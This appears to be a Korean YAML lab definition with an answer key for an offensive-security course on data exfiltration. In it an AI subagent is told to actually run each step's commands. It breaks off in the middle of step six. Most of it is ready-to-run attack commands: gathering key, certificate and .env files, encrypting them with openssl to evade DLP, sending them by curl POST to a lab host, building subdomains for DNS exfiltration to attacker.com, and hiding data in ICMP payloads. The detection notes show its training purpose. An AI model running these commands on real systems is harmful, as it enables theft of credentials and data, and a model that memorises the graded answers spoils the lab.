lab_id: attack-adv-ai-week10
title: 데이터 유출 기법 (AI 지원)
version: ai
course: attack-adv-ai
week: 10
description: 침투 후 데이터를 은밀하게 외부로 유출하는 다양한 기법을 실습한다. DNS, HTTP, ICMP, 스테가노그래피 등 다양한
  채널을 통한 데이터 유출과 탐지 회피를 다룬다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- 다양한 프로토콜을 활용한 데이터 유출 기법을 적용한다
- 암호화, 인코딩, 스테가노그래피를 통한 탐지 회피를 수행한다
- DLP 시스템의 탐지 기법과 우회 방법을 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 유출 대상 데이터를 수집하라. 시스템에서 민감 파일(설정, 키, 인증서)을 검색하고 /tmp/exfil_staging에
    수집하라.
  hint: find 명령으로 .conf, .key, .pem, .env 파일을 검색한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: 유출 대상 데이터를 수집해줘

    📎 참고 (CLI): mkdir -p /tmp/exfil_staging && find /etc /home -name ''*.conf'' -o
    -name ''*.key'' -o -name ''*.pem'' -o -name ''.env'' 2>/dev/null | head -10 >
    /tmp/exfil_staging/file_list.txt && echo ''hostname:'' $(hostname) > /tmp/exfil_staging/sysinfo.txt
    && id >> /tmp/exfil_staging/sysinfo.txt && ip addr | grep inet >> /tmp/exfil_staging/sysinfo.txt
    && cat /tmp/exfil_staging/file_list.txt && echo ''---'' && cat /tmp/exfil_staging/sysinfo.txt'
  answer_detail: 데이터 유출의 첫 단계는 스테이징(Staging)이다. 민감 파일을 하나의 디렉토리에 수집하고, 압축/암호화 후 유출한다.
    시스템 정보, 네트워크 구성, 자격증명 파일이 주요 대상이다. MITRE ATT&CK T1074(Data Staged)에 해당한다.
  verify:
    type: output_contains
    expect:
    - exfil_staging
    - find
    field: stdout
    semantic:
      intent: 데이터 유출 스테이징 단계 — 민감 파일(.conf/.key/.pem/.env) 검색과 시스템 정보 수집 결과를 한 디렉토리(/tmp/exfil_staging)
        로 집약
      success_criteria:
      - /tmp/exfil_staging 디렉토리 생성 후 수집된 파일/시스템 정보를 그 안에 저장
      - find 또는 locate 로 민감 확장자(.conf/.key/.pem/.env 등) 파일 목록 산출
      - 수집된 내용 일부를 cat 으로 화면 출력해 수집 성공 확인
      acceptable_methods:
      - mkdir -p 후 find + redirect 로 파일 목록 작성
      - locate 또는 grep -r 로 특정 키워드 파일 검색
      - tar --exclude 로 민감 파일만 선별 후 스테이징
      - PowerShell Get-ChildItem 등 OS 동등 명령
      negative_signs:
      - 디렉토리 생성 없이 화면 출력만
      - 민감 파일 검색 없이 /etc/passwd 등 고정 파일만 복사
      - MITRE ATT&CK T1074 (Data Staged) 맥락 전혀 없음
  target_vm: attacker
  script: mkdir -p /tmp/exfil_staging && find /etc /home -name '*.conf' -o -name '*.key'
    -o -name '*.pem' -o -name '.env' 2>/dev/null | head -10 > /tmp/exfil_staging/file_list.txt
    && echo 'hostname:' $(hostname) > /tmp/exfil_staging/sysinfo.txt && id >> /tmp/exfil_staging/sysinfo.txt
    && ip addr | grep inet >> /tmp/exfil_staging/sysinfo.txt && cat /tmp/exfil_staging/file_list.txt
    && echo '---' && cat /tmp/exfil_staging/sysinfo.txt
  risk_level: low
  bastion_prompt: '유출 대상 데이터를 수집해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: 수집된 데이터를 tar로 압축하고 openssl로 AES-256 암호화하라.
  hint: tar czf로 압축하고, openssl enc -aes-256-cbc로 암호화한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 수집된 데이터를 tar로 압축하고 openssl로 AES-256 암호화해줘

    📎 참고 (CLI): tar czf /tmp/exfil_data.tar.gz -C /tmp/exfil_staging . && openssl
    enc -aes-256-cbc -salt -in /tmp/exfil_data.tar.gz -out /tmp/exfil_data.enc -pass
    pass:ExfilKey2026 -pbkdf2 && ls -la /tmp/exfil_data.enc && echo '''' && echo ''Original:''
    && ls -la /tmp/exfil_data.tar.gz && echo ''Encrypted:'' && file /tmp/exfil_data.enc'
  answer_detail: 암호화는 네트워크 전송 시 DLP/IDS가 내용을 분석하지 못하게 한다. AES-256-CBC는 강력한 대칭 암호화이며,
    -pbkdf2로 키 유도를 강화한다. 실제 APT 그룹은 커스텀 암호화나 XOR 인코딩으로 시그니처 탐지를 회피하기도 한다.
  verify:
    type: output_contains
    expect:
    - exfil_data.enc
    - openssl
    field: stdout
    semantic:
      intent: 수집 데이터를 tar 압축 후 openssl AES-256-CBC 로 암호화해 네트워크 전송 시 DLP·IDS 의 내용 분석을
        회피
      success_criteria:
      - tar czf 로 /tmp/exfil_staging 내용을 단일 아카이브로 묶음
      - openssl enc -aes-256-cbc -pbkdf2 로 아카이브를 암호화해 /tmp/exfil_data.enc 생성
      - 암호화 결과 파일의 크기·MIME·매직바이트 변화를 확인(file 명령 등)
      acceptable_methods:
      - tar czf + openssl enc -aes-256-cbc -salt -pbkdf2
      - gpg --symmetric --cipher-algo AES256 로 동등 암호화
      - 7z a -p<pwd> -mhe=on 로 헤더까지 암호화
      - python cryptography Fernet 으로 대칭 암호화
      negative_signs:
      - 압축만 하고 암호화 생략
      - base64 인코딩만 수행 (암호화 아님)
      - 키 길이가 AES-256 미만이거나 pbkdf2 없이 취약한 파라미터
  target_vm: attacker
  script: tar czf /tmp/exfil_data.tar.gz -C /tmp/exfil_staging . && openssl enc -aes-256-cbc
    -salt -in /tmp/exfil_data.tar.gz -out /tmp/exfil_data.enc -pass pass:ExfilKey2026
    -pbkdf2 && ls -la /tmp/exfil_data.enc && echo '' && echo 'Original:' && ls -la
    /tmp/exfil_data.tar.gz && echo 'Encrypted:' && file /tmp/exfil_data.enc
  risk_level: medium
  bastion_prompt: '수집된 데이터를 tar로 압축하고 openssl로 AES-256 암호화해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: HTTP를 통한 데이터 유출을 시뮬레이션하라. curl POST 요청으로 암호화된 데이터를 Base64 인코딩하여 전송하라.
  hint: base64로 인코딩하고, curl -X POST -d로 전송한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: HTTP를 통한 데이터 유출을 시뮬레이션하라. curl POST 요청으로 암호화된 데이터를 Base64 인코딩하여
    전송해줘

    📎 참고 (CLI): ENCODED=$(base64 -w 0 /tmp/exfil_data.enc) && echo "Data size: $(echo
    -n $ENCODED | wc -c) bytes (base64)" && echo "First 100 chars: ${ENCODED:0:100}..."
    && curl -s -X POST -d "upload=$ENCODED" http://10.20.30.80:3000/api/Feedbacks
    -o /dev/null -w ''HTTP Status: %{http_code}'' 2>/dev/null && echo '''''
  answer_detail: HTTP POST를 통한 데이터 유출은 가장 일반적인 방법이다. 정상적인 웹 트래픽으로 위장할 수 있으며, HTTPS를
    사용하면 내용이 암호화된다. DLP 시스템은 HTTP 본문의 크기, Base64 패턴, 높은 엔트로피를 탐지 지표로 활용한다. MITRE ATT&CK
    T1048.001에 해당한다.
  verify:
    type: output_contains
    expect: Data size
    field: stdout
    semantic:
      intent: HTTP POST 본문에 Base64 인코딩된 암호화 데이터를 실어 전송해 HTTP 채널 기반 데이터 유출 시뮬레이션
      success_criteria:
      - base64 -w 0 또는 동등 방법으로 암호화 파일을 단일 Base64 문자열로 인코딩
      - curl -X POST 또는 동등 도구로 <target> 에 POST 본문으로 전송
      - 요청 크기 또는 응답 상태 코드 확인 및 DLP 탐지 지표(본문 크기·Base64 비율·엔트로피) 언급
      acceptable_methods:
      - curl -X POST -d '...' 로 단일 파라미터 전송
      - curl -F 로 multipart/form-data 업로드
      - python requests.post(data=...) 로 전송
      - wget --post-file 로 파일 직접 업로드
      negative_signs:
      - 암호화 파일 대신 평문을 Base64 만 하여 전송
      - POST 대신 GET 쿼리에 모두 실어 길이 제한 초과 가능성
      - 전송 결과 확인 없이 명령만 나열
  target_vm: attacker
  script: 'ENCODED=$(base64 -w 0 /tmp/exfil_data.enc) && echo "Data size: $(echo -n
    $ENCODED | wc -c) bytes (base64)" && echo "First 100 chars: ${ENCODED:0:100}..."
    && curl -s -X POST -d "upload=$ENCODED" http://10.20.30.80:3000/api/Feedbacks
    -o /dev/null -w ''HTTP Status: %{http_code}'' 2>/dev/null && echo '''''
  risk_level: medium
  bastion_prompt: 'HTTP를 통한 데이터 유출을 시뮬레이션하라. curl POST 요청으로 암호화된 데이터를 Base64 인코딩하여
    전송해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: DNS를 통한 데이터 유출을 시뮬레이션하라. 파일 내용을 Base32로 인코딩하여 DNS 쿼리의 서브도메인으로 전송하라.
  hint: base32로 인코딩하고 63자씩 분할하여 DNS 쿼리 라벨로 사용한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: DNS를 통한 데이터 유출을 시뮬레이션해줘

    📎 참고 (CLI): echo ''secret data for DNS exfil'' | base32 | tr -d ''='' | fold -w
    50 | head -5 | while read chunk; do echo "DNS query: ${chunk}.exfil.attacker.com";
    done && echo '''' && echo ''DNS exfil characteristics:'' && echo ''- Max label
    length: 63 chars'' && echo ''- Max query length: 253 chars'' && echo ''- Throughput:
    ~10-50 KB/min'' && echo ''- Detection: query length, entropy, volume'''
  answer_detail: DNS 유출은 거의 모든 환경에서 DNS(53)가 허용되는 점을 악용한다. 데이터를 Base32/Base64로 인코딩하여
    서브도메인 라벨에 포함하고, 공격자의 권한 있는 DNS 서버에서 수신한다. 대역폭은 낮지만 방화벽 우회에 효과적이다. 탐지를 위해 DNS 쿼리
    길이와 엔트로피를 모니터링한다.
  verify:
    type: output_contains
    expect:
    - DNS query
    - dig
    field: stdout
    semantic:
      intent: DNS 쿼리 서브도메인 라벨에 Base32 인코딩한 데이터 청크를 실어 공격자 DNS 서버로 전송하는 DNS 유출 시뮬레이션
      success_criteria:
      - 입력 데이터를 base32 로 인코딩하고 63 자 미만 라벨로 분할
      - 각 청크를 <chunk>.exfil.<attacker_domain> 형태의 FQDN 으로 나열 또는 실제 쿼리 수행
      - DNS 라벨 63 자 / 쿼리 253 자 제한과 낮은 대역폭(~10-50 KB/min) 특성 언급
      acceptable_methods:
      - echo ... | base32 | tr -d '=' | fold -w 50 | while read ...; do dig @<server>
        $chunk.exfil.<domain>; done
      - python socket.gethostbyname 반복 호출
      - nslookup 또는 host 명령으로 실제 쿼리
      - dnscat2/iodine 도구 사용 예시 제시
      negative_signs:
      - base64 인코딩만 하고 길이 제한 무시
      - 단일 라벨에 전체 데이터를 압축하려 시도
      - DNS 가 허용되는 이유·방어 관점(쿼리 길이·엔트로피 모니터링) 언급 없음
  target_vm: attacker
  script: 'echo ''secret data for DNS exfil'' | base32 | tr -d ''='' | fold -w 50
    | head -5 | while read chunk; do echo "DNS query: ${chunk}.exfil.attacker.com";
    done && echo '''' && echo ''DNS exfil characteristics:'' && echo ''- Max label
    length: 63 chars'' && echo ''- Max query length: 253 chars'' && echo ''- Throughput:
    ~10-50 KB/min'' && echo ''- Detection: query length, entropy, volume'''
  risk_level: medium
  bastion_prompt: 'DNS를 통한 데이터 유출을 시뮬레이션해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: ICMP를 통한 데이터 유출을 시뮬레이션하라. ping의 데이터 필드에 정보를 포함하여 전송하는 원리를 보여라.
  hint: xxd로 데이터를 16진수로 변환하고 ping -p 옵션으로 전송한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: ICMP를 통한 데이터 유출을 시뮬레이션하라. ping의 데이터 필드에 정보를 포함하여 전송하는 원리를 보여라해줘

    📎 참고 (CLI): DATA_HEX=$(echo -n ''exfil'' | xxd -p) && echo "Data in hex: $DATA_HEX"
    && echo "Sending via ICMP data field:" && ping -c 1 -p $DATA_HEX -s 64 10.20.30.80
    2>&1 | head -5 && echo '''' && echo ''ICMP exfil tools: icmpsh, icmp-exfil, ptunnel''
    && echo ''Detection: ICMP payload size > 64 bytes, high frequency'''
  answer_detail: ICMP 유출은 ICMP 패킷의 데이터 필드(최대 65,507 바이트)에 정보를 숨겨 전송한다. ping -p 옵션으로
    패턴 데이터를 설정하거나, raw 소켓으로 ICMP 패킷을 직접 구성한다. 대부분의 방화벽이 ICMP를 허용하므로 유효하지만, 대역폭이 매우
    제한적이다.
  verify:
    type: output_contains
    expect: Data in hex
    field: stdout
    semantic:
      intent: ICMP 터널링 유출 — ping -p 로 데이터 페이로드를 ICMP Echo 의 data 필드에 실어 전송 (방화벽 ICMP
        허용 악용)
      success_criteria:
      - ping -p <hex> -s <size> <target> 로 커스텀 페이로드 포함
      - hex 페이로드가 ICMP data 에 실리는 원리 설명
      - C2 통신·데이터 유출 맥락(icmpsh/ptunnel) 언급
      acceptable_methods:
      - ping -c N -p <hex> -s <size> <target>
      - hping3 --icmp --data <payload> <target>
      - scapy IP(dst=...)/ICMP()/Raw(load=...) sr1
      - nping --icmp --data-string <data>
      negative_signs:
      - 기본 ping 만 실행 (-p 페이로드 없음)
      - ICMP 설명 없이 TCP/UDP 만 언급
      - 대상·데이터 모두 누락
  target_vm: attacker
  script: 'DATA_HEX=$(echo -n ''exfil'' | xxd -p) && echo "Data in hex: $DATA_HEX"
    && echo "Sending via ICMP data field:" && ping -c 1 -p $DATA_HEX -s 64 10.20.30.80
    2>&1 | head -5 && echo '''' && echo ''ICMP exfil tools: icmpsh, icmp-exfil, ptunnel''
    && echo ''Detection: ICMP payload size > 64 bytes, high frequency'''
  risk_level: medium
  bastion_prompt: 'ICMP를 통한 데이터 유출을 시뮬레이션하라. ping의 데이터 필드에 정보를 포함하여 전송하는 원리를 보여라해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: 스테가노그래피를 사용하여 이미지 파일에 데이터를 숨기는 원리를 시뮬레이션하라. 텍스트 데이터를 파일 끝에 추가하는 기법을
    보여라.
  hint: cat으로 이미지와 데이터를 결합하거나, echo >> 로 파일 끝에 데이터를 추가한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 스테가노그래피를 사용하여 이미지 파일에 데이터를 숨기는 원리를 시뮬레이션해줘

